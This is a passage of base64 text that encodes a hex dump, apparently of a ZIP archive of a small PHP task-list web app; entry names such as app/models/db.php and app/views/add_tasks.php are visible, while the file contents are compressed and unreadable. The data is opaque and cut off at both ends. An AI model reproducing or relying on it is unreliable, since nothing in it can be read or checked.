jIDQyIGJmIDA3ICBhMCA4OSBkNiA1NCBmMCAxNyA2ZCA5MCAgIC4uPS5MQi4uIC4uLlQuLm0uCiAgICAwMDAwMEYwNSAgMzIgODMgZTEgNWQgYmYgZjcgNzAgZGYgIGVmIGY1IDdiIGQxIDc3IGVmIDNlIGZjICAgMi4uXS4ucC4gLi57LncuPi4KICAgIDAwMDAwRjE1ICBmNCBmYyBjNyBjNyA0NyBjOCA0YyBjZSAgYWMgMjggNzIgNmYgNjAgODggY2YgNjcgICAuLi4uRy5MLiAuKHJvYC4uZwogICAgMDAwMDBGMjUgIDFlIGUxIDVlIDI5IDIxIDA4IGRmIDNiICA5MCAyOCAyNyAwNiA0MSA5MiAyMSBhNSAgIC4uXikhLi47IC4oJy5BLiEuCiAgICAwMDAwMEYzNSAgODkgOTkgNzkgOWYgOWUgN2YgZjYgNmYgIGJjIDhlIDg2IGEzIDljIGNjIGJjIDA1ICAgLi55Li4uLm8gLi4uLi4uLi4KICAgIDAwMDAwRjQ1ICAyNSBhZiA1MiAyOCBlMyA0MSAyMiBiOCAgMjEgZGMgNWEgYmUgNTIgNmMgYjIgMTkgICAlLlIoLkEiLiAhLlouUmwuLgogICAgMDAwMDBGNTUgIDI2IDBiIDlhIDEwIGJmIDljIDVjIDAyICBlNSBkNCA1MCBjNCA3YyA5ZCAyMCA0NiAgICYuLi4uLlwuIC4uUC58LiBGCiAgICAwMDAwMEY2NSAgNjYgZDcgNTcgNDEgOGQgNjQgYTggNjEgIGU0IGZlIDU3IDMxIGE3IDNjIDFhIDU1ICAgZi5XQS5kLmEgLi5XMS48LlUKICAgIDAwMDAwRjc1ICA5MyA1MiBhZSBjZCBhYSAxZSAwMiBjNCAgMDIgYWYgNjAgNWQgOGQgMDEgNTIgYmIgICAuUi4uLi4uLiAuLmBdLi5SLgogICAgMDAwMDBGODUgIDhkIDlmIGEyIDljIGIyIDU1IDA4IDE3ICA0ZiA2NCAyZSAwOCA3YyA3YSA3ZiA3MSAgIC4uLi4uVS4uIE9kLi58ei5xCiAgICAwMDAwMEY5NSAgMDkgY2YgMjggMTMgMzkgYmEgODQgNWYgIDA4IDI3IDBiIGZiIGZlIDlkIDI4IDhjICAgLi4oLjkuLl8gLicuLi4uKC4KICAgIDAwMDAwRkE1ICBiOCAxZCA2OCBjNCBiNSBhZiA4OSBhMiAgZTkgNWQgMDMgMTIgYTMgZTQgZjMgNWMgICAuLmguLi4uLiAuXS4uLi4uXAogICAgMDAwMDBGQjUgIDg5IDgyIDYzIDNmIDExIDRjIGE4IDEwICBkZSBhNCA4MSA3YiAzNiAxNiAzOSA1MiAgIC4uYz8uTC4uIC4uLns2LjlSCiAgICAwMDAwMEZDNSAgOTYgNTMgMDggYWQgMDQgNTMgMmQgMTkgIGIyIDliIGE2IDhjIDJjIDM3IDUyIGM0ICAgLlMuLi5TLS4gLi4uLiw3Ui4KICAgIDAwMDAwRkQ1ICBlOCA5YyBmYiBkNCA5MCA1YyA4NyA5MCAgNTggZmYgODkgZGEgZTggZmUgMmUgYjQgICAuLi4uLlwuLiBYLi4uLi4uLgogICAgMDAwMDBGRTUgIGExIGU5IGNhIGFmIDIzIGIzIGE3IGNmICAwOCA5ZCA2NyA1NiA3YyAxZCAwNCA4YiAgIC4uLi4jLi4uIC4uZ1Z8Li4uCiAgICAwMDAwMEZGNSAgYWMgOTYgN2UgZWQgZjcgYWEgYzEgMTUgIDczIDQxIDI5IGQ3IDIyIGNhIDg5IDgyICAgLi5%2BLi4uLi4gc0EpLiIuLi4KICAgIDAwMDAxMDA1ICBmNSAyOSBmMiA2OSBjNyAzNyBhMSAzMCAgNTEgYmUgNDIgOTggMTYgOTYgZDMgOGQgICAuKS5pLjcuMCBRLkIuLi4uLgogICAgMDAwMDEwMTUgIDVjIDc2IDU0IDRiIDVmIDY3IDA4IDhiICA1NyBlYiA5OCA3ZCBjNiA4MSA1YyA4MiAgIFx2VEtfZy4uIFcuLn0uLlwuCiAgICAwMDAwMTAyNSAgOWEgYzcgNjggMTAgNWMgNDIgZmQgYmYgIGJhIDFlIDZlIGVjIGM1IDgyIGE4IDk0ICAgLi5oLlxCLi4gLi5uLi4uLi4KICAgIDAwMDAxMDM1ICAzOSBlYiA4YyA2MiA0YyBmOCA0NiA1MSAgOWUgNmEgMDggOTMgMjAgZTggYTAgNGIgICA5Li5iTC5GUSAuai4uIC4uSwogICAgMDAwMDEwNDUgIDg0IDMxIGU1IGYzIGIwIDg0IDJkIGE1ICBlZSA2NyBjOCBkMiBmOCA2NSA5NCBmNiAgIC4xLi4uLi0uIC5nLi4uZS4uCiAgICAwMDAwMTA1NSAgZmMgMzcgY2EgOWUgOGMgY2QgMGIgYzEgIGMzIDZhIDljIDBhIDk1IDViIDA2IDEzICAgLjcuLi4uLi4gLmouLi5bLi4KICAgIDAwMDAxMDY1ICAwZCAwNCA2OSBlMiA1YiBmNyA0NSA2MSAgY2UgMDUgMjYgY2MgYzQgYTIgMWIgOWUgICAuLmkuWy5FYSAuLiYuLi4uLgogICAgMDAwMDEwNzUgIDBkIDUyIDA4IDY1IGI2IDBkIDZjIGI2ICA0ZCA4NyA2NyBjMyA5YiA4ZCA1YiA4OCAgIC5SLmUuLmwuIE0uZy4uLlsuCiAgICAwMDAwMTA4NSAgMjYgYWMgOTMgYzkgZTQgYzggM2EgODcgIGRmIGRhIDFmIDRlIDBkIDM3IGYxIDMxICAgJi4uLi4uOi4gLi4uTi43LjEKICAgIDAwMDAxMDk1ICA1NSAyNCBhOSA1YyBiNCBhOCA0NSBkZSAgYzYgNzAgOGUgYTQgM2QgZmEgYTkgNWMgICBVJC5cLi5FLiAucC4uPS4uXAogICAgMDAwMDEwQTUgIGVlIGU0IDljIDZmIDg0IGRjIDhhIDYxICBiYiBiNyBkYiBkNSA3NyA0NyAyZiA2MSAgIC4uLm8uLi5hIC4uLi53Ry9hCiAgICAwMDAwMTBCNSAgN2QgMjggYmUgOGMgYTQgZTYgZDQgMjIgIDg2IDYyIGMyIDBlIGQwIDhlIDk5IDQ4ICAgfSguLi4uLiIgLmIuLi4uLkgKICAgIDAwMDAxMEM1ICAzZSBkZiA2ZCA1NSA5OCBhNiBmZiAxMCAgNGIgZWYgZWQgM2UgYmQgNTggMTggMjMgICA%2BLm1VLi4uLiBLLi4%2BLlguIwogICAgMDAwMDEwRDUgIDZjIDcwIGJiIGNjIDliIDgwIDRkIGE3ICBkMyA1MyBmYiA1MyAyZSAwYiAwMyBlYiAgIGxwLi4uLk0uIC5TLlMuLi4uCiAgICAwMDAwMTBFNSAgOWQgMmMgYmEgMGQgN2UgZDggY2YgYTEgIGViIDQwIDJlIDc3IDUyIGRhIDBhIDZkICAgLiwuLn4uLi4gLkAud1IuLm0KICAgIDAwMDAxMEY1ICBiYSA2YSBjMSAyOCA4NiAzNyA0OSA5MiAgMWMgY2IgZjggMmUgYjEgNmUgOGEgMzkgICAuai4oLjdJLiAuLi4uLm4uOQogICAgMDAwMDExMDUgIDMzIDZiIDU2IDcyIDNkIDlmIDY1IGJiICBiNCBjMyA1NCAyNCA4NSA2ZSBjOSA3NyAgIDNrVnI9LmUuIC4uVCQubi53CiAgICAwMDAwMTExNSAgZDEgNWMgYWEgYmMgYmQgYmQgYzEgZjEgIDFlIDRhIDZjIGY4IGM5IGMyIGRkIDVhICAgLlwuLi4uLi4gLkpsLi4uLloKICAgIDAwMDAxMTI1ICAwNiA3MCBiYyA5ZSA0MyBlMCA4MiA5MyAgMDMgNzEgMWEgY2IgZTUgYjcgMDQgMjIgICAucC4uQy4uLiAucS4uLi4uIgogICAgMDAwMDExMzUgIDI5IDk0IDc2IGQwIDUyIGQwIGFkIDFhICBlYyAxZSBmNiA4ZiBjNyAwMiBiNyBjMyAgICkudi5SLi4uIC4uLi4uLi4uCiAgICAwMDAwMTE0NSAgZmIgN2MgZjAgYWMgZGIgYmIgNjUgNzkgIGMwIGY5IGYxIGVkIDRkIDEwIGRmIGI2ICAgLnwuLi4uZXkgLi4uLk0uLi4KICAgIDAwMDAxMTU1ICA4YiAwMSBhMiA1MSBmMyBlMSA4ZiA0NiAgNzUgMjMgOGEgZGMgZTcgYmYgNmEgMGEgICAuLi5RLi4uRiB1Iy4uLi5qLgogICAgMDAwMDExNjUgIDk4IDJlIDIwIDYxIDQ4IGViIDk5IGI3ICA1MyBiZCA1ZSBkZCAyYSBhMiA2YyBkYyAgIC4uIGFILi4uIFMuXi4qLmwuCiAgICAwMDAwMTE3NSAgMzQgOTMgNmMgZGMgYzggZGMgNDkgNmUgIGFmIDczIDEyIDBmIDUwIDU5IDk3IDMzICAgNC5sLi4uSW4gLnMuLlBZLjMKICAgIDAwMDAxMTg1ICBjZiBhMSAyOCBjMSAxOCA1MSA3YSAyNCAgOTUgNDggNmMgZjMgN2MgMjkgZWQgYWUgICAuLiguLlF6JCAuSGwufCkuLgogICAgMDAwMDExOTUgIDZjIDNmIGY1IGMwIDM2IGJiIDRjIGUwICA5OSAyNyA4NSAzNiBjZCAzZSBkYiA2NCAgIGw/Li42LkwuIC4nLjYuPi5kCiAgICAwMDAwMTFBNSAgZGEgNTQgNjkgZjUgZDYgYTIgYWEgMzYgIGFiIGI0IGJkIDM1IDQ3IDk0IDc5IGY3ICAgLlRpLi4uLjYgLi4uNUcueS4KICAgIDAwMDAxMUI1ICA4ZiBlZSAxNSA0NiBhMyA1MiA1MyA5YiAgOTYgYTYgNTUgNjEgOTggOTUgYjQgMWQgICAuLi5GLlJTLiAuLlVhLi4uLgogICAgMDAwMDExQzUgIGQ1IDE1IGI0IDA3IDE0IDM3IGFiIGVhICA0NiA1YiA0ZiAxNCBmOSA1MiBkOCA0ZiAgIC4uLi4uNy4uIEZbTy4uUi5PCiAgICAwMDAwMTFENSAgMGEgNmUgODkgOGMgMmMgOTMgZmYgNDggIDRiIDVhIGJiIDU3IDliIDMzIGRlIGZkICAgLm4uLiwuLkggS1ouVy4zLi4KICAgIDAwMDAxMUU1ICBjNyA3YSA3NCA4ZSBkYyA2NiA0NSA0OSAgYjAgOWQgNTUgMWMgZGIgZjkgZmYgYTcgICAuenQuLmZFSSAuLlUuLi4uLgogICAgMDAwMDExRjUgIGQ5IGRkIDU1IDE3IDcxIDRlIDRkIGIzICA0YiA3OSAzNiAyZiAzNiBjNSAzYyA1OCAgIC4uVS5xTk0uIEt5Ni82LjxYCiAgICAwMDAwMTIwNSAgMjAgNTYgNTggNDkgNzkgZTQgNWUgMDMgIGU4IDM0IGM3IGY2IDc1IDU3IGE0IDY2ICAgIFZYSXkuXi4gLjQuLnVXLmYKICAgIDAwMDAxMjE1ICA0MiBkMyAwMSBkNSBmNiA2ZSAzMyBmOCAgZmUgZTUgZTkgZjEgZTkgZTkgZmQgODcgICBCLi4uLm4zLiAuLi4uLi4uLgogICAgMDAwMDEyMjUgIGRmIGZlIGJjIGE4IGIwIDg5IDUyIDQyICA1ZCBmYyAzNSAxYyBhZSA1YiA0MiAyNCAgIC4uLi4uLlJCIF0uNS4uW0IkCiAgICAwMDAwMTIzNSAgYzkgMDQgMWMgYjMgZGMgOTQgY2QgZDcgIDUzIGUwIDVmIDBhIGEyIDU2IGRmIDA0ICAgLi4uLi4uLi4gUy5fLi5WLi4KICAgIDAwMDAxMjQ1ICBiZSA2NSBiOSAwZiBmZSBkMCBhNCBmNiAgYzggMDUgYWYgOWMgMzQgN2UgNDYgYTMgICAuZS4uLi4uLiAuLi4uNH5GLgogICAgMDAwMDEyNTUgIGJhIDVlIGEyIDUxIDdkIGM3IGViIGY3ICBkYSA4YiA2MSBjMSA0ZiBmYSA1YiA1ZiAgIC5eLlF9Li4uIC4uYS5PLltfCiAgICAwMDAwMTI2NSAgMTQgZmYgMDUgNTAgNGIgMDMgMDQgMGEgIDAwIDAwIDAwIDAwIDAwIDE2IDA2IDI5ICAgLi4uUEsuLi4gLi4uLi4uLikKICAgIDAwMDAxMjc1ICA1OCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAgMDAgMDAgMDAgMDAgMDAgMGIgMDAgMDAgICBYLi4uLi4uLiAuLi4uLi4uLgogICAgMDAwMDEyODUgIDAwIDYxIDcwIDcwIDJmIDZkIDZmIDY0ICA2NSA2YyA3MyAyZiA1MCA0YiAwMyAwNCAgIC5hcHAvbW9kIGVscy9QSy4uCiAgICAwMDAwMTI5NSAgMTQgMDAgMDAgMDAgMDggMDAgMmIgYmQgIDJmIDU4IDRlIGI4IGFlIGY5IGQxIDAwICAgLi4uLi4uKy4gL1hOLi4uLi4KICAgIDAwMDAxMkE1ICAwMCAwMCAzYyAwMSAwMCAwMCAxMSAwMCAgMDAgMDAgNjEgNzAgNzAgMmYgNmQgNmYgICAuLjwuLi4uLiAuLmFwcC9tbwogICAgMDAwMDEyQjUgIDY0IDY1IDZjIDczIDJmIDY0IDYyIDJlICA3MCA2OCA3MCA1ZCA4ZSBjZCA2ZSBjMiAgIGRlbHMvZGIuIHBocF0uLm4uCiAgICAwMDAwMTJDNSAgMzAgMTAgODQgZWYgNDggYmMgYzMgMTIgIDcxIDQ4IGE0IDA0IDI1IGM2IDA5IDdmICAgMC4uLkguLi4gcUguLiUuLi4KICAgIDAwMDAxMkQ1ICAyZCBhOCBlYSA1MyA3MCA1YSAzOSBjZSAgNWEgNTggODQgMzggZDggNjkgYWIgMGEgICAtLi5TcFo5LiBaWC44LmkuLgogICAgMDAwMDEyRTUgIGYxIGVlIDhkIDgzIDBhIDA4IGVmIGM5ICAzMyAzYiBkZiBjZSBkYiBhZSAzZCBiNCAgIC4uLi4uLi4uIDM7Li4uLj0uCiAgICAwMDAwMTJGNSAgMzAgMWUgNGQgMWQgZDkgNmYgYjIgZDggIDg4IDEzIGMxIDNiIDA0IGI1IDkxIGEyICAgMC5NLi5vLi4gLi4uOy4uLi4KICAgIDAwMDAxMzA1ICAzZSAxOCBkNyAwNSA5YiBkZSBmYyA3MiAgNGYgOTYgMzUgZTYgYTYgYjYgYzIgYjkgICA%2BLi4uLi4uciBPLjUuLi4uLgogICAgMDAwMDEzMTUgIDFmIDYzIDJiIDJmIDBlIDQyIDU1IGRlICA5NyA4ZSBiMiA1MyAyYyA2NSA3YyBkMCAgIC5jKy8uQlUuIC4uLlMsZXwuCiAgICAwMDAwMTMyNSAgZjEgMDMgNWIgY2MgZjAgODggNzMgZGMgIGEzIDc3IDBiIDIyIGIxIGNhIGU2IDc5ICAgLi5bLi4ucy4gLncuIi4uLnkKICAgIDAwMDAxMzM1ICBjMiA5NiA2OSA5NiBmMCBiYyA0OCA5MyAgOTIgNzMgOTkgMjggYjYgNWEgOTQgYjkgICAuLmkuLi5ILiAucy4oLlouLgogICAgMDAwMDEzNDUgIGUyIDg1IDYyIGNhIDI3IGZiIGFjIDM0ICA0ZCBkMyA0NyA0ZSBiZiBlZSA1YyA2YiAgIC4uYi4nLi40IE0uR04uLlxrCiAgICAwMDAwMTM1NSAgZjQgM2YgOTIgNWQgZjggNWMgMzcgODYgIDQ3IGJmIDE4IGVlIGFkIDYyIGY4IGVmICAgLj8uXS5cNy4gRy4uLi5iLi4KICAgIDAwMDAxMzY1ICAxMyAwZCAyNCBhZCBjMiBjOSA0MCA4YiAgMmUgZTMgMTEgZjQgYWYgZDIgMTQgMDYgICAuLiQuLi5ALiAuLi4uLi4uLgogICAgMDAwMDEzNzUgIDlmIDM3IGEwIDM2IDBkIDI4IGExIDZiICBhYSBkNiAxMCBjMCBlYyBlNSAxYyA5MiAgIC43LjYuKC5rIC4uLi4uLi4uCiAgICAwMDAwMTM4NSAgYjUgYzYgODYgOTEgMDcgNWQgM2QgY2IgIGNmIDZlIGZiIDA3IDUwIDRiIDAzIDA0ICAgLi4uLi5dPS4gLm4uLlBLLi4KICAgIDAwMDAxMzk1ICAwYSAwMCAwMCAwMCAwMCAwMCA3OSBhOSAgMmMgNTggMDAgMDAgMDAgMDAgMDAgMDAgICAuLi4uLi55LiAsWC4uLi4uLgogICAgMDAwMDEzQTUgIDAwIDAwIDAwIDAwIDAwIDAwIDBhIDAwICAwMCAwMCA2MSA3MCA3MCAyZiA3NiA2OSAgIC4uLi4uLi4uIC4uYXBwL3ZpCiAgICAwMDAwMTNCNSAgNjUgNzcgNzMgMmYgNTAgNGIgMDMgMDQgIDE0IDAwIDAwIDAwIDA4IDAwIGNiIGI1ICAgZXdzL1BLLi4gLi4uLi4uLi4KICAgIDAwMDAxM0M1ICAyYyA1OCBhMSAzMSBmMSBhMSBlMiAwMyAgMDAgMDAgMGQgMGIgMDAgMDAgMTcgMDAgICAsWC4xLi4uLiAuLi4uLi4uLgogICAgMDAwMDEzRDUgIDAwIDAwIDYxIDcwIDcwIDJmIDc2IDY5ICA2NSA3NyA3MyAyZiA2MSA2NCA2NCA1ZiAgIC4uYXBwL3ZpIGV3cy9hZGRfCiAgICAwMDAwMTNFNSAgNzQgNjEgNzMgNmIgNzMgMmUgNzAgNjggIDcwIGE1IDU2IDZkIDZmIGRiIDM2IDEwICAgdGFza3MucGggcC5WbW8uNi4KICAgIDAwMDAxM0Y1ICBmZSA2ZSBjMCBmZiBlMSBjNiA3ZSA2OCAgMGIgODQgOTYgNjIgZDcgNDMgZTIgYzggICAubi4uLi5%2BaCAuLi5iLkMuLgogICAgMDAwMDE0MDUgIDJhIDhhIGE2IDFiIDBhIDBjIDY4IDgwICAyNCAwNSBmNiAyOSBhMCBjNCBiMyA0NSAgICouLi4uLmguICQuLikuLi5FCiAgICAwMDAwMTQxNSAgNTQgMjIgMzUgOTIgNzIgOWMgMDUgZmIgIGVmIGEzIGRlIDE1IGJmIDM1IDQwIDZkICAgVCI1LnIuLi4gLi4uLi41QG0KICAgIDAwMDAxNDI1ICAwMyAyNiA4ZiA3NyBjNyBlNyA4ZSBjZiAgZjEgMTggN2MgY2MgOTMgMWMgYzYgMjMgICAuJi53Li4uLiAuLnwuLi4uIwogICAgMDAwMDE0MzUgIDIxIGUzIGI0IGUwIGY4IDhlIDRjIDI2ICA1ZSBhYyBhNCBkNSAyYSA0ZCA1MSAxYiAgICEuLi4uLkwmIF4uLi4qTVEuCiAgICAwMDAwMTQ0NSAgNGYgOTggODcgNTQgYWQgODUgOWMgMzggIDM1IGYyIGZlIDZhIDNjIGZhIDE4IDhlICAgTy4uVC4uLjggNS4uajwuLi4KICAgIDAwMDAxNDU1ICA0NyBlMyA1MSBmMCAxYiBhNSBjMCAzOCAgYjcgY2MgZmMgOTggMjQgMzYgNGIgODEgICBHLlEuLi4uOCAuLi4uJDZLLgogICAgMDAwMDE0NjUgIGQyIGIwIDE0IDVmIDdmIGZiIDdjIGY3ICBmNyBjZCAxNyAyOCA2NSBhNSBhMCA1YSAgIC4uLl8uLnwuIC4uLihlLi5aCiAgICAwMDAwMTQ3NSAgNGIgOTkgNWMgMmYgMDkgNGEgNTIgNDkgIDkwIDcxIGY3IDBmIDEwIDY0IDY4IDE5ICAgSy5cLy5KUkkgLnEuLi5kaC4KICAgIDAwMDAxNDg1ICBjNCAwOSBkMyAwNiBlZCA5MiBkYyBkZiAgZmQgNDEgMmYgYzggNjAgNDUgYjIgMGMgICAuLi4uLi4uLiAuQS8uYEUuLgogICAgMDAwMDE0OTUgIDk3IDY0IDIzIGYwIDMxIDU3IGRhIDEyICAyOCA2MSBhMSA3NCA5YSA4ZiA4MiBkYiAgIC5kIy4xVy4uIChhLnQuLi4uCiAgICAwMDAwMTRBNSAgNjQgYzkgNzEgMjMgNjIgYTQgZDUgZTQgIDBjIDg0IDE0IDU2IGIwIDk0IDlhIDk4ICAgZC5xI2IuLi4gLi4uVi4uLi4KICAgIDAwMDAxNEI1ICBhNSBiOCAzYyA5ZiBmOCA4ZCAyNyAyYiAgNmMgOGEgZTEgMjcgOWUgMDkgMDkgZDcgICAuLjwuLi4nKyBsLi4nLi4uLgogICAgMDAwMDE0QzUgIGNjIDI0IDkxIDYyIDlhIDAzIDg1IDRmICA5YyBjMyA5ZCAwMyAxZiA3OCBiNSA0NiAgIC4kLmIuLi5PIC4uLi4ueC5GCiAgICAwMDAwMTRENSAgYTUgNmMgZWMgNTMgMzMgMDQgODggMTQgIDdmIDgyIGU3IDdhIDBjIGIwIDcyIDdiICAgLmwuUzMuLi4gLi4uei4ucnsKICAgIDAwMDAxNEU1ICBkMyAxNSBjYiA0NCBmYSBiNCA4MCBiNyAgYjcgYjggNTYgMDggZjcgNWYgZGYgOWUgICAuLi5ELi4uLiAuLlYuLl8uLgogICAgMDAwMDE0RjUgIDM5IDFmIDg5IGNhIGQ4IDE5IGZjIDg5ICAxMiAzNyBlZSBmZiAzYiA2YSBjZSBhNCAgIDkuLi4uLi4uIC43Li47ai4uCiAgICAwMDAwMTUwNSAgMWIgMTggMjYgMGQgMzUgYTggYzUgZWEgIGFhIDc1IDEyIGIxIGY4IGM3IDVhIGFiICAgLi4mLjUuLi4gLnUuLi4uWi4KICAgIDAwMDAxNTE1ICA0MiA3MiAxYSBhYiA1NCBlOSAwNSBiYyAgNTkgZjkgZTUgYjcgZDMgYzggOTggNzYgICBCci4uVC4uLiBZLi4uLi4udgogICAgMDAwMDE1MjUgIGI5IDVlIDQwIDJmIGM5IDVkIDkyIDg1ICA1YyAwZiA0NSA1YyA5OCAzYyA2NSAwZSAgIC5eQC8uXS4uIFwuRVwuPGUuCiAgICAwMDAwMTUzNSAgYzcgMmEgYzUgNmQgMjcgNGQgNTAgYWMgIDEzIGJiIDgwIDczIGRmIGRmIDI0IDhkICAgLioubSdNUC4gLi4ucy4uJC4KICAgIDAwMDAxNTQ1ICBmNCBiZiBmMSBhOCAxZSBiYyAzMSA4MiAgNjMgYzQgNzQgMWYgNTAgOTUgYjYgMDUgICAuLi4uLi4xLiBjLnQuUC4uLgogICAgMDAwMDE1NTUgIDRjIGU3IDdlIGJlIDNkIDA1IDcwIDM2ICA5YiA3NSBjYiAxZCBlOCBkNSA2YSAxNyAgIEwufi49LnA2IC51Li4uLmouCiAgICAwMDAwMTU2NSAgMWYgYjUgMmEgNzcgZGUgODYgY2UgMGUgIGMzIDJjIDI3IDk0IDBiIDhkIGIxIDE1ICAgLi4qdy4uLi4gLiwnLi4uLi4KICAgIDAwMDAxNTc1ICA0YSAyZSA0YSA5ZiA0NSAyNiBmNyBmMCAgMzYgNjcgMGQgY2YgNDMgM2IgMTcgZGMgICBKLkouRSYuLiA2Zy4uQzsuLgogICAgMDAwMDE1ODUgIDdlIDVlIGE2IDdlIGJlIDNkIDZhIDllICA0YyA3YiAwZiBmYiAxMSA3NSBmYSA5MyAgIH5eLn4uPWouIEx7Li4udS4uCiAgICAwMDAwMTU5NSAgMGMgNjUgNDEgODUgYzUgMGMgOWUgZjcgIDM2IDM4IDFmIDA2IDY1IDcxIDZiIDI5ICAgLmVBLi4uLi4gNjguLmVxaykKICAgIDAwMDAxNUE1ICBjNyA1OCA2OSA1NiBlMyA5NyA0YSBlMiAgYzkgMDQgNTkgZWQgODggMjAgNmEgZTUgICAuWGlWLi5KLiAuLlkuLiBqLgogICAgMDAwMDE1QjUgIGRkIGZjIDgyIDNmIDk5IDE5IDQwIDY2ICA5MCAwYSA0OSA1NSA2MSA4ZiAwMyA1YiAgIC4uLj8uLkBmIC4uSVVhLi5bCiAgICAwMDAwMTVDNSAgMjQgNmEgODMgODMgZjMgM2IgNzAgNTQgIGYzIGY5IDdjIGNmIDdlIGE1IDc0IDQ2ICAgJGouLi47cFQgLi58Ln4udEYKICAgIDAwMDAxNUQ1ICBjYiA2YyAzMCAyMSA4NyBlNiAxOSBkYiAgZDIgODYgMDIgMWYgZmMgNjEgODAgMmQgICAubDAhLi4uLiAuLi4uLmEuLQogICAgMDAwMDE1RTUgIDAzIDU5IDYxIGQ1IDI5IDVlIDFjIGUwICBjMCBjZSBmOSA0NyA0YSA3MyBkNCA1NCAgIC5ZYS4pXi4uIC4uLkdKcy5UCiAgICAwMDAwMTVGNSAgMzMgMmUgMGEgYjMgODAgOGIgMTcgNGIgIDViIDZhIDEyIGM2IGQ1IGEzIGUzIDM1ICAgMy4uLi4uLksgW2ouLi4uLjUKICAgIDAwMDAxNjA1ICBmOCA5NSAxZCBlOCA3NSBjNCBkZSBmOSAgNjcgZDAgZmMgMjYgZTcgZWYgNzcgYTMgICAuLi4udS4uLiBnLi4mLi53LgogICAgMDAwMDE2MTUgIDI5IDgzIDgxIGU3IDVmIGUwIDE3IGMwICA5YSAzOSA5YSA5ZSBjZiBmNyAyOSA5MyAgICkuLi5fLi4uIC45Li4uLikuCiAgICAwMDAwMTYyNSAgYjIgMDggZDMgOWQgN2EgMzcgZTIgNWYgIDc0IGRhIGJmIDc3IGRhIDI3IDQ5IDI0ICAgLi4uLno3Ll8gdC4udy4nSSQKICAgIDAwMDAxNjM1ICA2NCA1ZSBkOCA5ZiBmMSBhNyA0ZSA4YSAgMTMgYmEgODAgOGQgNGEgMDUgNzcgNWMgICBkXi4uLi5OLiAuLi4uSi53XAogICAgMDAwMDE2NDUgIDhkIGUzIGFiIDIzIDM5IDliIDBmIDJjICAwZiAyMyBlYSA0ZiAzYSBiMiBmMiAyNCAgIC4uLiM5Li4sIC4jLk86Li4kCiAgICAwMDAwMTY1NSAgM2IgNjYgMWYgMmUgMmYgNzggNzQgOTIgIGFhIGY1IGVlIDNiIDljIGVlIGUzIDk4ICAgO2YuLi94dC4gLi4uOy4uLi4KICAgIDAwMDAxNjY1ICBlNiBkYiBkNyAwMCA4ZCAwYiA2ZCA0YSAgZDcgYjkgMTIgYWUgMDggZjUgNGYgMDIgICAuLi4uLi5tSiAuLi4uLi5PLgogICAgMDAwMDE2NzUgIGY4IGQ1IDAyIDcxIDYxIGJmIGEyIDM0ICBhNiA5NyAxNyA3ZSA3NCBkOSAxYiAwMyAgIC4uLnFhLi40IC4uLn50Li4uCiAgICAwMDAwMTY4NSAgMDQgNWUgN2IgZDkgMDcgNWUgZDMgOTEgIDgyIGYyIGNhIGFmIDFiIDAxIDE3IDFiICAgLl57Li5eLi4gLi4uLi4uLi4KICAgIDAwMDAxNjk1ICAxMCA3YyA0OSA5YSA2YiBiMyBlOSAyNSAgMGMgMTIgOGQgYWIgMjUgZTEgNmQgMWYgICAufEkuay4uJSAuLi4uJS5tLgogICAgMDAwMDE2QTUgIGE5IDlhIDIyIGM0IDI5IDMzIDY2IDQ5ICBiYSA1MiAyNSA2MSBkOSA1YyBlZSAwZCAgIC4uIi4pM2ZJIC5SJWEuXC4uCiAgICAwMDAwMTZCNSAgZWEgYzAgNjMgNjEgOGIgNmEgNjAgNWYgIDM2IDRkIDczIGNjIGY2IGJiIGViIDc3ICAgLi5jYS5qYF8gNk1zLi4uLncKICAgIDAwMDAxNkM1ICA1NSA2NyAzMiA0NyBhYyBkZCA3OSAzYyAgOWMgZjQgNTAgZWUgN2UgY2EgODEgZWIgICBVZzJHLi55PCAuLlAufi4uLgogICAgMDAwMDE2RDUgIGU3IDJlIDkzIGM3IGFjIGZmIGFhIDU2ICA1YiBkMyBjMCA3MyBhOSAwOCBjNyBhMyAgIC4uLi4uLi5WIFsuLnMuLi4uCiAgICAwMDAwMTZFNSAgMTcgNTkgNjkgNmUgNTcgZDIgMzggYWYgIGU0IDcxIGVkIGU4IGU1IDdkIDQzIGJhICAgLllpblcuOC4gLnEuLi59Qy4KICAgIDAwMDAxNkY1ICBlZCA4MyA2NCAxYSBmNiAyZCAzNyA5OSAgZjYgMGIgNTUgNTEgYjMgYWEgNWEgOTcgICAuLmQuLi03LiAuLlVRLi5aLgogICAgMDAwMDE3MDUgIGJiIDhmIDhmIDVjIGFiIDE4IDhkIDc5ICA2OCA0MyBhZSAzMSBiYiBjNyA0MSBhMiAgIC4uLlwuLi55IGhDLjEuLkEuCiAgICAwMDAwMTcxNSAgMWMgOGMgOWIgNmYgYjcgNzcgNjQgMTggIDYwIDVkIGMzIGNlIDYxIDlkIGUyIDZiICAgLi4uby53ZC4gYF0uLmEuLmsKICAgIDAwMDAxNzI1ICAzNCBiMSAxNiA3OSBlOSA5OSA4NCBlNSAgYzYgMzAgOTAgMmMgMDIgYWYgNTIgMWYgICA0Li55Li4uLiAuMC4sLi5SLgogICAgMDAwMDE3MzUgIGRhIGQ3IDE1IDZjIDlmIDcyIGY3IGVjICAyOCAyZiA3YSA1MiA0NSBiYiBlYiBhYSAgIC4uLmwuci4uICgvelJFLi4uCiAgICAwMDAwMTc0NSAgNzkgOTcgZWMgODkgMzUgZmUgNTMgYjggIDdiIDg3IDg3IGUzIGQxIDcxIDRjIGI3ICAgeS4uLjUuUy4gey4uLi5xTC4KICAgIDAwMDAxNzU1ICA5NiBkOSBjMiAzNCA3MCBlYSBjOSAyMSAgMjQgMDYgNTMgNzcgODEgNzUgZGIgZDcgICAuLi40cC4uISAkLlN3LnUuLgogICAgMDAwMDE3NjUgIDhhIGMzIDlkIDViIGM5IDYwIDUzIGU4ICAzZSA4MSBhYSAyMCBjMSA4NiBhNSA4NSAgIC4uLlsuYFMuID4uLiAuLi4uCiAgICAwMDAwMTc3NSAgZDMgY2YgNTEgOTYgMTUgNGMgYzIgOWIgIDdhIDEwIDc4IGY1IGZhIDI5IDFiIDIxICAgLi5RLi5MLi4gei54Li4pLiEKICAgIDAwMDAxNzg1ICA2ZiBiNCA1YSA2YiA5NyA3YyAxMiA3ZSAgOTUgZDAgNGUgNWUgNjMgMWEgYWIgMmMgICBvLlprLnwufiAuLk5eYy4uLAogICAgMDAwMDE3OTUgIDRmIGQxIDIyIDI3IGUxIGU3IDc2IDc4ICBjMCAyZSBmMCBlYSAyMCA1ZiBhNiA2YiAgIE8uIicuLnZ4IC4uLi4gXy5rCiAgICAwMDAwMTdBNSAgNzggMDQgYTYgODggMzIgNjEgNDkgZWIgIGI3IGE1IDRmIDliIDg2IDk2IDE0IDB